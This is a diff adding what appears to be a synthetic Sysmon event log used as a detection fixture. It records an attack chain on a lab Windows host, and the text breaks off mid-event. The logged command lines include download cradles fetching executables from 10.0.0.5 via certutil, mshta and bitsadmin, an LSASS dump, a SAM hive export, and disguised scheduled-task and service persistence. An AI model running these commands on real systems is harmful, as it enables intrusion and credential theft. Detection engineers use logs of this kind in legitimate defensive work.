@@ -1,0 +1,679 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Events>
+
+   <!-- Event 1: whoami /all - initial discovery -->
+   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+      <System>
+         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+         <EventID>1</EventID>
+         <Version>5</Version>
+         <Level>4</Level>
+         <Task>1</Task>
+         <Opcode>0</Opcode>
+         <Keywords>0x8000000000000000</Keywords>
+         <TimeCreated SystemTime="2024-12-05T09:01:11.1234560Z" />
+         <EventRecordID>5001</EventRecordID>
+         <Correlation />
+         <Execution ProcessID="4028" ThreadID="5100" />
+         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+         <Computer>win11v.condef.local</Computer>
+         <Security UserID="S-1-5-18" />
+      </System>
+      <EventData>
+         <Data Name="RuleName">technique_id=T1033,technique_name=System Owner/User Discovery</Data>
+         <Data Name="UtcTime">2024-12-05 09:01:11.123</Data>
+         <Data Name="ProcessGuid">{a1b2c3d4-0001-674c-aa01-000000000c00}</Data>
+         <Data Name="ProcessId">7100</Data>
+         <Data Name="Image">C:\Windows\System32\whoami.exe</Data>
+         <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+         <Data Name="Description">whoami - displays logged on user information</Data>
+         <Data Name="Product">Microsoft® Windows® Operating System</Data>
+         <Data Name="Company">Microsoft Corporation</Data>
+         <Data Name="OriginalFileName">whoami.exe</Data>
+         <Data Name="CommandLine">whoami /all</Data>
+         <Data Name="CurrentDirectory">C:\Users\jsmith\</Data>
+         <Data Name="User">CONDEF\jsmith</Data>
+         <Data Name="LogonGuid">{a1b2c3d4-88b9-674c-1111-160000000000}</Data>
+         <Data Name="LogonId">0x1a2b3c</Data>
+         <Data Name="TerminalSessionId">1</Data>
+         <Data Name="IntegrityLevel">Medium</Data>
+         <Data Name="Hashes">SHA1=C23488BA47972B04F795D34B35C8257EC4B7AC9D,MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED</Data>
+         <Data Name="ParentProcessGuid">{a1b2c3d4-8800-674c-7000-000000000c00}</Data>
+         <Data Name="ParentProcessId">4200</Data>
+         <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+         <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+         <Data Name="ParentUser">CONDEF\jsmith</Data>
+      </EventData>
+   </Event>
+
+   <!-- Event 2: net user /domain - domain user enumeration -->
+   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+      <System>
+         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+         <EventID>1</EventID>
+         <Version>5</Version>
+         <Level>4</Level>
+         <Task>1</Task>
+         <Opcode>0</Opcode>
+         <Keywords>0x8000000000000000</Keywords>
+         <TimeCreated SystemTime="2024-12-05T09:01:45.4321000Z" />
+         <EventRecordID>5002</EventRecordID>
+         <Correlation />
+         <Execution ProcessID="4028" ThreadID="5101" />
+         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+         <Computer>win11v.condef.local</Computer>
+         <Security UserID="S-1-5-18" />
+      </System>
+      <EventData>
+         <Data Name="RuleName">technique_id=T1087.002,technique_name=Domain Account Discovery</Data>
+         <Data Name="UtcTime">2024-12-05 09:01:45.432</Data>
+         <Data Name="ProcessGuid">{a1b2c3d4-0002-674c-aa02-000000000c00}</Data>
+         <Data Name="ProcessId">7200</Data>
+         <Data Name="Image">C:\Windows\System32\net.exe</Data>
+         <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+         <Data Name="Description">Net Command</Data>
+         <Data Name="Product">Microsoft® Windows® Operating System</Data>
+         <Data Name="Company">Microsoft Corporation</Data>
+         <Data Name="OriginalFileName">net.exe</Data>
+         <Data Name="CommandLine">net user /domain</Data>
+         <Data Name="CurrentDirectory">C:\Users\jsmith\</Data>
+         <Data Name="User">CONDEF\jsmith</Data>
+         <Data Name="LogonGuid">{a1b2c3d4-88b9-674c-1111-160000000000}</Data>
+         <Data Name="LogonId">0x1a2b3c</Data>
+         <Data Name="TerminalSessionId">1</Data>
+         <Data Name="IntegrityLevel">Medium</Data>
+         <Data Name="Hashes">SHA1=AABB1122334455667788990011223344AABB1122,MD5=AABBCCDDEEFF00112233445566778899,SHA256=AABB112233445566778899001122334455667788990011223344556677889900AA,IMPHASH=AABB1234CCDD5678EEFF9012AABB3456</Data>
+         <Data Name="ParentProcessGuid">{a1b2c3d4-8800-674c-7000-000000000c00}</Data>
+         <Data Name="ParentProcessId">4200</Data>
+         <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+         <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+         <Data Name="ParentUser">CONDEF\jsmith</Data>
+      </EventData>
+   </Event>
+
+   <!-- Event 3: net localgroup administrators - local admin group enumeration -->
+   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+      <System>
+         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+         <EventID>1</EventID>
+         <Version>5</Version>
+         <Level>4</Level>
+         <Task>1</Task>
+         <Opcode>0</Opcode>
+         <Keywords>0x8000000000000000</Keywords>
+         <TimeCreated SystemTime="2024-12-05T09:02:10.7654320Z" />
+         <EventRecordID>5003</EventRecordID>
+         <Correlation />
+         <Execution ProcessID="4028" ThreadID="5102" />
+         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+         <Computer>win11v.condef.local</Computer>
+         <Security UserID="S-1-5-18" />
+      </System>
+      <EventData>
+         <Data Name="RuleName">technique_id=T1069.001,technique_name=Local Groups Discovery</Data>
+         <Data Name="UtcTime">2024-12-05 09:02:10.765</Data>
+         <Data Name="ProcessGuid">{a1b2c3d4-0003-674c-aa03-000000000c00}</Data>
+         <Data Name="ProcessId">7300</Data>
+         <Data Name="Image">C:\Windows\System32\net.exe</Data>
+         <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+         <Data Name="Description">Net Command</Data>
+         <Data Name="Product">Microsoft® Windows® Operating System</Data>
+         <Data Name="Company">Microsoft Corporation</Data>
+         <Data Name="OriginalFileName">net.exe</Data>
+         <Data Name="CommandLine">net localgroup administrators</Data>
+         <Data Name="CurrentDirectory">C:\Users\jsmith\</Data>
+         <Data Name="User">CONDEF\jsmith</Data>
+         <Data Name="LogonGuid">{a1b2c3d4-88b9-674c-1111-160000000000}</Data>
+         <Data Name="LogonId">0x1a2b3c</Data>
+         <Data Name="TerminalSessionId">1</Data>
+         <Data Name="IntegrityLevel">Medium</Data>
+         <Data Name="Hashes">SHA1=AABB1122334455667788990011223344AABB1122,MD5=AABBCCDDEEFF00112233445566778899,SHA256=AABB112233445566778899001122334455667788990011223344556677889900AA,IMPHASH=AABB1234CCDD5678EEFF9012AABB3456</Data>
+         <Data Name="ParentProcessGuid">{a1b2c3d4-8800-674c-7000-000000000c00}</Data>
+         <Data Name="ParentProcessId">4200</Data>
+         <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+         <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+         <Data Name="ParentUser">CONDEF\jsmith</Data>
+      </EventData>
+   </Event>
+
+   <!-- Event 4: ipconfig /all - network discovery -->
+   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+      <System>
+         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+         <EventID>1</EventID>
+         <Version>5</Version>
+         <Level>4</Level>
+         <Task>1</Task>
+         <Opcode>0</Opcode>
+         <Keywords>0x8000000000000000</Keywords>
+         <TimeCreated SystemTime="2024-12-05T09:02:55.9870000Z" />
+         <EventRecordID>5004</EventRecordID>
+         <Correlation />
+         <Execution ProcessID="4028" ThreadID="5103" />
+         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+         <Computer>win11v.condef.local</Computer>
+         <Security UserID="S-1-5-18" />
+      </System>
+      <EventData>
+         <Data Name="RuleName">technique_id=T1016,technique_name=System Network Configuration Discovery</Data>
+         <Data Name="UtcTime">2024-12-05 09:02:55.987</Data>
+         <Data Name="ProcessGuid">{a1b2c3d4-0004-674c-aa04-000000000c00}</Data>
+         <Data Name="ProcessId">7400</Data>
+         <Data Name="Image">C:\Windows\System32\ipconfig.exe</Data>
+         <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+         <Data Name="Description">IP Configuration Utility</Data>
+         <Data Name="Product">Microsoft® Windows® Operating System</Data>
+         <Data Name="Company">Microsoft Corporation</Data>
+         <Data Name="OriginalFileName">ipconfig.exe</Data>
+         <Data Name="CommandLine">ipconfig /all</Data>
+         <Data Name="CurrentDirectory">C:\Users\jsmith\</Data>
+         <Data Name="User">CONDEF\jsmith</Data>
+         <Data Name="LogonGuid">{a1b2c3d4-88b9-674c-1111-160000000000}</Data>
+         <Data Name="LogonId">0x1a2b3c</Data>
+         <Data Name="TerminalSessionId">1</Data>
+         <Data Name="IntegrityLevel">Medium</Data>
+         <Data Name="Hashes">SHA1=1122334455667788990011223344556677889900,MD5=00112233445566778899AABBCCDDEEFF,SHA256=0011223344556677889900AABBCCDDEEFF0011223344556677889900AABBCCDD,IMPHASH=0011AABB2233CCDD4455EEFF66778899</Data>
+         <Data Name="ParentProcessGuid">{a1b2c3d4-8800-674c-7000-000000000c00}</Data>
+         <Data Name="ParentProcessId">4200</Data>
+         <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+         <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+         <Data Name="ParentUser">CONDEF\jsmith</Data>
+      </EventData>
+   </Event>
+
+   <!-- Event 5: certutil LOLBin download cradle -->
+   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+      <System>
+         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+         <EventID>1</EventID>
+         <Version>5</Version>
+         <Level>4</Level>
+         <Task>1</Task>
+         <Opcode>0</Opcode>
+         <Keywords>0x8000000000000000</Keywords>
+         <TimeCreated SystemTime="2024-12-05T09:05:30.1230000Z" />
+         <EventRecordID>5005</EventRecordID>
+         <Correlation />
+         <Execution ProcessID="4028" ThreadID="5104" />
+         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+         <Computer>win11v.condef.local</Computer>
+         <Security UserID="S-1-5-18" />
+      </System>
+      <EventData>
+         <Data Name="RuleName">technique_id=T1105,technique_name=Ingress Tool Transfer</Data>
+         <Data Name="UtcTime">2024-12-05 09:05:30.123</Data>
+         <Data Name="ProcessGuid">{a1b2c3d4-0005-674c-aa05-000000000c00}</Data>
+         <Data Name="ProcessId">8100</Data>
+         <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
+         <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+         <Data Name="Description">CertUtil.exe</Data>
+         <Data Name="Product">Microsoft® Windows® Operating System</Data>
+         <Data Name="Company">Microsoft Corporation</Data>
+         <Data Name="OriginalFileName">CertUtil.exe</Data>
+         <Data Name="CommandLine">certutil.exe -urlcache -split -f http://10.0.0.5/stage2.exe C:\Users\Public\stage2.exe</Data>
+         <Data Name="CurrentDirectory">C:\Users\jsmith\AppData\Local\Temp\</Data>
+         <Data Name="User">CONDEF\jsmith</Data>
+         <Data Name="LogonGuid">{a1b2c3d4-88b9-674c-1111-160000000000}</Data>
+         <Data Name="LogonId">0x1a2b3c</Data>
+         <Data Name="TerminalSessionId">1</Data>
+         <Data Name="IntegrityLevel">Medium</Data>
+         <Data Name="Hashes">SHA1=BBCC112233445566778899001122334455667788,MD5=BBCCDD0011223344556677889900AABB,SHA256=BBCC11223344556677889900AABBCCDDEEFF0011223344556677889900AABBCC,IMPHASH=BBCC1234DDEE5678FFAA9012BBCC3456</Data>
+         <Data Name="ParentProcessGuid">{a1b2c3d4-8800-674c-7000-000000000c00}</Data>
+         <Data Name="ParentProcessId">4200</Data>
+         <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+         <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+         <Data Name="ParentUser">CONDEF\jsmith</Data>
+      </EventData>
+   </Event>
+
+   <!-- Event 6: mshta.exe remote script execution -->
+   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+      <System>
+         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+         <EventID>1</EventID>
+         <Version>5</Version>
+         <Level>4</Level>
+         <Task>1</Task>
+         <Opcode>0</Opcode>
+         <Keywords>0x8000000000000000</Keywords>
+         <TimeCreated SystemTime="2024-12-05T09:06:14.5670000Z" />
+         <EventRecordID>5006</EventRecordID>
+         <Correlation />
+         <Execution ProcessID="4028" ThreadID="5105" />
+         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+         <Computer>win11v.condef.local</Computer>
+         <Security UserID="S-1-5-18" />
+      </System>
+      <EventData>
+         <Data Name="RuleName">technique_id=T1218.005,technique_name=Mshta</Data>
+         <Data Name="UtcTime">2024-12-05 09:06:14.567</Data>
+         <Data Name="ProcessGuid">{a1b2c3d4-0006-674c-aa06-000000000c00}</Data>
+         <Data Name="ProcessId">8200</Data>
+         <Data Name="Image">C:\Windows\System32\mshta.exe</Data>
+         <Data Name="FileVersion">11.0.26100.1882 (WinBuild.160101.0800)</Data>
+         <Data Name="Description">Microsoft (R) HTML Application host</Data>
+         <Data Name="Product">Internet Explorer</Data>
+         <Data Name="Company">Microsoft Corporation</Data>
+         <Data Name="OriginalFileName">MSHTA.EXE</Data>
+         <Data Name="CommandLine">mshta.exe http://10.0.0.5/payload.hta</Data>
+         <Data Name="CurrentDirectory">C:\Users\jsmith\AppData\Local\Temp\</Data>
+         <Data Name="User">CONDEF\jsmith</Data>
+         <Data Name="LogonGuid">{a1b2c3d4-88b9-674c-1111-160000000000}</Data>
+         <Data Name="LogonId">0x1a2b3c</Data>
+         <Data Name="TerminalSessionId">1</Data>
+         <Data Name="IntegrityLevel">Medium</Data>
+         <Data Name="Hashes">SHA1=CCDD1122334455667788990011223344CCDD1122,MD5=CCDD00EEFF11223344556677889900AA,SHA256=CCDD1122334455667788990011AABBCCDDEEFF0011223344556677889900CCDD,IMPHASH=CCDD1234EEFF5678AABB9012CCDD3456</Data>
+         <Data Name="ParentProcessGuid">{a1b2c3d4-8800-674c-7000-000000000c00}</Data>
+         <Data Name="ParentProcessId">4200</Data>
+         <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+         <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+         <Data Name="ParentUser">CONDEF\jsmith</Data>
+      </EventData>
+   </Event>
+
+   <!-- Event 7: wscript.exe running suspicious VBScript -->
+   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+      <System>
+         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+         <EventID>1</EventID>
+         <Version>5</Version>
+         <Level>4</Level>
+         <Task>1</Task>
+         <Opcode>0</Opcode>
+         <Keywords>0x8000000000000000</Keywords>
+         <TimeCreated SystemTime="2024-12-05T09:07:02.3450000Z" />
+         <EventRecordID>5007</EventRecordID>
+         <Correlation />
+         <Execution ProcessID="4028" ThreadID="5106" />
+         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+         <Computer>win11v.condef.local</Computer>
+         <Security UserID="S-1-5-18" />
+      </System>
+      <EventData>
+         <Data Name="RuleName">technique_id=T1059.005,technique_name=Visual Basic</Data>
+         <Data Name="UtcTime">2024-12-05 09:07:02.345</Data>
+         <Data Name="ProcessGuid">{a1b2c3d4-0007-674c-aa07-000000000c00}</Data>
+         <Data Name="ProcessId">8300</Data>
+         <Data Name="Image">C:\Windows\System32\wscript.exe</Data>
+         <Data Name="FileVersion">5.812.26100.1882</Data>
+         <Data Name="Description">Microsoft ® Windows Based Script Host</Data>
+         <Data Name="Product">Microsoft ® Windows Script Host</Data>
+         <Data Name="Company">Microsoft Corporation</Data>
+         <Data Name="OriginalFileName">wscript.exe</Data>
+         <Data Name="CommandLine">wscript.exe C:\Users\jsmith\AppData\Roaming\update.vbs</Data>
+         <Data Name="CurrentDirectory">C:\Users\jsmith\AppData\Roaming\</Data>
+         <Data Name="User">CONDEF\jsmith</Data>
+         <Data Name="LogonGuid">{a1b2c3d4-88b9-674c-1111-160000000000}</Data>
+         <Data Name="LogonId">0x1a2b3c</Data>
+         <Data Name="TerminalSessionId">1</Data>
+         <Data Name="IntegrityLevel">Medium</Data>
+         <Data Name="Hashes">SHA1=DDEE1122334455667788990011223344DDEE1122,MD5=DDEE00FFAA11223344556677889900BB,SHA256=DDEE1122334455667788990011BBCCDDEEFF0011223344556677889900DDEE,IMPHASH=DDEE1234FFAA5678BBCC9012DDEE3456</Data>
+         <Data Name="ParentProcessGuid">{a1b2c3d4-8801-674c-7001-000000000c00}</Data>
+         <Data Name="ParentProcessId">4201</Data>
+         <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+         <Data Name="ParentCommandLine">C:\Windows\explorer.exe</Data>
+         <Data Name="ParentUser">CONDEF\jsmith</Data>
+      </EventData>
+   </Event>
+
+   <!-- Event 8: rundll32 comsvcs.dll MiniDump - LSASS credential dumping -->
+   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+      <System>
+         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+         <EventID>1</EventID>
+         <Version>5</Version>
+         <Level>4</Level>
+         <Task>1</Task>
+         <Opcode>0</Opcode>
+         <Keywords>0x8000000000000000</Keywords>
+         <TimeCreated SystemTime="2024-12-05T09:10:45.6780000Z" />
+         <EventRecordID>5008</EventRecordID>
+         <Correlation />
+         <Execution ProcessID="4028" ThreadID="5107" />
+         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+         <Computer>win11v.condef.local</Computer>
+         <Security UserID="S-1-5-18" />
+      </System>
+      <EventData>
+         <Data Name="RuleName">technique_id=T1003.001,technique_name=LSASS Memory</Data>
+         <Data Name="UtcTime">2024-12-05 09:10:45.678</Data>
+         <Data Name="ProcessGuid">{a1b2c3d4-0008-674c-aa08-000000000c00}</Data>
+         <Data Name="ProcessId">9100</Data>
+         <Data Name="Image">C:\Windows\System32\rundll32.exe</Data>
+         <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+         <Data Name="Description">Windows host process (Rundll32)</Data>
+         <Data Name="Product">Microsoft® Windows® Operating System</Data>
+         <Data Name="Company">Microsoft Corporation</Data>
+         <Data Name="OriginalFileName">RUNDLL32.EXE</Data>
+         <Data Name="CommandLine">rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Users\Public\lsass.dmp full</Data>
+         <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
+         <Data Name="User">CONDEF\Administrator</Data>
+         <Data Name="LogonGuid">{a1b2c3d4-88b9-674c-6ead-160000000000}</Data>
+         <Data Name="LogonId">0x16ad6e</Data>
+         <Data Name="TerminalSessionId">1</Data>
+         <Data Name="IntegrityLevel">High</Data>
+         <Data Name="Hashes">SHA1=EEFF1122334455667788990011223344EEFF1122,MD5=EEFF00AABB11223344556677889900CC,SHA256=EEFF1122334455667788990011CCDDEEFFAA0011223344556677889900EEFF,IMPHASH=EEFF1234AABB5678CCDD9012EEFF3456</Data>
+         <Data Name="ParentProcessGuid">{a1b2c3d4-8800-674c-7000-000000000c00}</Data>
+         <Data Name="ParentProcessId">4200</Data>
+         <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+         <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+         <Data Name="ParentUser">CONDEF\Administrator</Data>
+      </EventData>
+   </Event>
+
+   <!-- Event 9: schtasks persistence creation -->
+   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+      <System>
+         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+         <EventID>1</EventID>
+         <Version>5</Version>
+         <Level>4</Level>
+         <Task>1</Task>
+         <Opcode>0</Opcode>
+         <Keywords>0x8000000000000000</Keywords>
+         <TimeCreated SystemTime="2024-12-05T09:11:30.2220000Z" />
+         <EventRecordID>5009</EventRecordID>
+         <Correlation />
+         <Execution ProcessID="4028" ThreadID="5108" />
+         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+         <Computer>win11v.condef.local</Computer>
+         <Security UserID="S-1-5-18" />
+      </System>
+      <EventData>
+         <Data Name="RuleName">technique_id=T1053.005,technique_name=Scheduled Task</Data>
+         <Data Name="UtcTime">2024-12-05 09:11:30.222</Data>
+         <Data Name="ProcessGuid">{a1b2c3d4-0009-674c-aa09-000000000c00}</Data>
+         <Data Name="ProcessId">9200</Data>
+         <Data Name="Image">C:\Windows\System32\schtasks.exe</Data>
+         <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+         <Data Name="Description">Task Scheduler Configuration Tool</Data>
+         <Data Name="Product">Microsoft® Windows® Operating System</Data>
+         <Data Name="Company">Microsoft Corporation</Data>
+         <Data Name="OriginalFileName">schtasks.exe</Data>
+         <Data Name="CommandLine">schtasks /create /tn "WindowsUpdate" /tr "C:\Users\Public\stage2.exe" /sc onlogon /ru SYSTEM</Data>
+         <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
+         <Data Name="User">CONDEF\Administrator</Data>
+         <Data Name="LogonGuid">{a1b2c3d4-88b9-674c-6ead-160000000000}</Data>
+         <Data Name="LogonId">0x16ad6e</Data>
+         <Data Name="TerminalSessionId">1</Data>
+         <Data Name="IntegrityLevel">High</Data>
+         <Data Name="Hashes">SHA1=FF001122334455667788990011223344FF001122,MD5=FF0000AABB11223344556677889900DD,SHA256=FF00112233445566778899AABBCCDDEEFFAA001122334455667788990011FF00,IMPHASH=FF001234AABB5678DDEE9012FF003456</Data>
+         <Data Name="ParentProcessGuid">{a1b2c3d4-8800-674c-7000-000000000c00}</Data>
+         <Data Name="ParentProcessId">4200</Data>
+         <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+         <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+         <Data Name="ParentUser">CONDEF\Administrator</Data>
+      </EventData>
+   </Event>
+
+   <!-- Event 10: reg.exe SAM hive access -->
+   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+      <System>
+         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+         <EventID>1</EventID>
+         <Version>5</Version>
+         <Level>4</Level>
+         <Task>1</Task>
+         <Opcode>0</Opcode>
+         <Keywords>0x8000000000000000</Keywords>
+         <TimeCreated SystemTime="2024-12-05T09:12:05.4440000Z" />
+         <EventRecordID>5010</EventRecordID>
+         <Correlation />
+         <Execution ProcessID="4028" ThreadID="5109" />
+         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+         <Computer>win11v.condef.local</Computer>
+         <Security UserID="S-1-5-18" />
+      </System>
+      <EventData>
+         <Data Name="RuleName">technique_id=T1012,technique_name=Query Registry</Data>
+         <Data Name="UtcTime">2024-12-05 09:12:05.444</Data>
+         <Data Name="ProcessGuid">{a1b2c3d4-0010-674c-aa10-000000000c00}</Data>
+         <Data Name="ProcessId">9300</Data>
+         <Data Name="Image">C:\Windows\System32\reg.exe</Data>
+         <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+         <Data Name="Description">Registry Console Tool</Data>
+         <Data Name="Product">Microsoft® Windows® Operating System</Data>
+         <Data Name="Company">Microsoft Corporation</Data>
+         <Data Name="OriginalFileName">reg.exe</Data>
+         <Data Name="CommandLine">reg.exe save HKLM\SAM C:\Users\Public\sam.hive</Data>
+         <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
+         <Data Name="User">CONDEF\Administrator</Data>
+         <Data Name="LogonGuid">{a1b2c3d4-88b9-674c-6ead-160000000000}</Data>
+         <Data Name="LogonId">0x16ad6e</Data>
+         <Data Name="TerminalSessionId">1</Data>
+         <Data Name="IntegrityLevel">High</Data>
+         <Data Name="Hashes">SHA1=AA001122334455667788990011223344AA001122,MD5=AA0000BBCC11223344556677889900EE,SHA256=AA00112233445566778899BBCCDDEEFFAA001122334455667788990011AA00,IMPHASH=AA001234BBCC5678EEFF9012AA003456</Data>
+         <Data Name="ParentProcessGuid">{a1b2c3d4-8800-674c-7000-000000000c00}</Data>
+         <Data Name="ParentProcessId">4200</Data>
+         <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+         <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+         <Data Name="ParentUser">CONDEF\Administrator</Data>
+      </EventData>
+   </Event>
+
+   <!-- Event 11: bitsadmin download -->
+   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+      <System>
+         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+         <EventID>1</EventID>
+         <Version>5</Version>
+         <Level>4</Level>
+         <Task>1</Task>
+         <Opcode>0</Opcode>
+         <Keywords>0x8000000000000000</Keywords>
+         <TimeCreated SystemTime="2024-12-05T09:14:20.8880000Z" />
+         <EventRecordID>5011</EventRecordID>
+         <Correlation />
+         <Execution ProcessID="4028" ThreadID="5110" />
+         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+         <Computer>win11v.condef.local</Computer>
+         <Security UserID="S-1-5-18" />
+      </System>
+      <EventData>
+         <Data Name="RuleName">technique_id=T1197,technique_name=BITS Jobs</Data>
+         <Data Name="UtcTime">2024-12-05 09:14:20.888</Data>
+         <Data Name="ProcessGuid">{a1b2c3d4-0011-674c-aa11-000000000c00}</Data>
+         <Data Name="ProcessId">9500</Data>
+         <Data Name="Image">C:\Windows\System32\bitsadmin.exe</Data>
+         <Data Name="FileVersion">7.8.26100.1882 (WinBuild.160101.0800)</Data>
+         <Data Name="Description">BITS administration utility</Data>
+         <Data Name="Product">Microsoft® Windows® Operating System</Data>
+         <Data Name="Company">Microsoft Corporation</Data>
+         <Data Name="OriginalFileName">bitsadmin.exe</Data>
+         <Data Name="CommandLine">bitsadmin /transfer "WindowsUpdate" http://10.0.0.5/implant.exe C:\Users\Public\implant.exe</Data>
+         <Data Name="CurrentDirectory">C:\Users\jsmith\AppData\Local\Temp\</Data>
+         <Data Name="User">CONDEF\jsmith</Data>
+         <Data Name="LogonGuid">{a1b2c3d4-88b9-674c-1111-160000000000}</Data>
+         <Data Name="LogonId">0x1a2b3c</Data>
+         <Data Name="TerminalSessionId">1</Data>
+         <Data Name="IntegrityLevel">Medium</Data>
+         <Data Name="Hashes">SHA1=BB001122334455667788990011223344BB001122,MD5=BB0000CCDD11223344556677889900FF,SHA256=BB00112233445566778899CCDDEEFFAA001122334455667788990011BB00,IMPHASH=BB001234CCDD5678FFAA9012BB003456</Data>
+         <Data Name="ParentProcessGuid">{a1b2c3d4-8800-674c-7000-000000000c00}</Data>
+         <Data Name="ParentProcessId">4200</Data>
+         <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+         <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+         <Data Name="ParentUser">CONDEF\jsmith</Data>
+      </EventData>
+   </Event>
+
+   <!-- Event 12: sc.exe service installation for persistence -->
+   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+      <System>
+         <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+         <EventID>1</EventID>
+         <Version>5</Version>
+         <Level>4</Level>
+         <Task>1</Task>
+         <Opcode>0</Opcode>
+         <Keywords>0x8000000000000000</Keywords>
+         <TimeCreated SystemTime="2024-12-05T09:15:00.1110000Z" />
+         <EventRecordID>5012</EventRecordID>
+         <Correlation />
+         <Execution ProcessID="4028" ThreadID="5111" />
+         <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+         <Computer>win11v.condef.local</Computer>
+         <Security UserID="S-1-5-18" />
+      </System>
+      <EventData>
+         <Data Name="RuleName">technique_id=T1543.003,technique_name=Windows Service</Data>
+         <Data Name="UtcTime">2024-12-05 09:15:00.111</Data>
+         <Data Name="ProcessGuid">{a1b2c3d4-0012-674c-aa12-000000000c00}</Data>
+         <Data Name="ProcessId">9600</Data>
+         <Data Name="Image">C:\Windows\System32\sc.exe</Data>
+         <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
+         <Data Name="Description">Service Control Manager Configuration Tool</Data>
+         <Data Name="Product">Microsoft® Windows® Operating System</Data>
+         <Data Name="Company">Microsoft Corporation</Data>
+         <Data Name="OriginalFileName">sc.exe</Data>
+         <Data Name="CommandLine">sc.exe create "SysHelper" binPath= "C:\Users\Public\implant.exe" start= auto</Data>
+         <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
+         <Data Name="User">CONDEF\Administrator</Data>
+         <Data Name="LogonGuid">{a1b2c3d4-88b9-674c-6ead-160000000000}</Data>
+         <Data Name="LogonId">0x16ad6e</Data>
+         <Data Name="TerminalSessionId">1</Data>
+         <Data Name="IntegrityLevel">High</Data>
